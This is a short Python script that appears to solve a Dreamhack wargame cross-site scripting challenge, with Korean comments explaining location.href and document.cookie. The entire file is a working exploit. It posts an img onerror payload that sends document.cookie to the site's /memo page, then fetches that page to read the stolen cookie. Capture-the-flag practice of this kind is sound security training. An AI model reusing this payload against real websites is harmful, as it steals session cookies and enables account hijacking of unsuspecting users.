import requests

url = f"http://host3.dreamhack.games:11555//flag"
payload = '<img src="x" onerror="location.href=\'/memo?memo=\'+document.cookie">'


#locationn.href : 전체 url을 반환하거나 url을 업데이트할 수 있는 속성값
#document.cookie : 해당 페이지에서 사용하는 쿠키를 읽고 쓰는 속성값

res = requests.post(url,data={"param":payload},timeout=5)
print(res.text)
res = requests.get(f"http://host3.dreamhack.games:11555//memo")
print(res.text)
